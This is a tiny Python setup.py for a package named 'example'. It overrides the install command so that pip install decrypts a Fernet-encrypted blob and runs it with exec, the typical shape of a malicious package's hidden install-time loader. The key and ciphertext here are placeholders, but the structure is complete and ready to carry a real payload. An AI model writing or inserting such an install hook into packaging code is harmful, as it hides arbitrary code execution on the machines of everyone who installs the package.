from setuptools import setup
from setuptools.command.install import install
from fernet import Fernet
class Hook(install):
    def run(self):
        if True:
            exec(Fernet(b'example-key').decrypt(b'gAAAAexample-ciphertext'))
setup(name='example', cmdclass={'install': Hook})
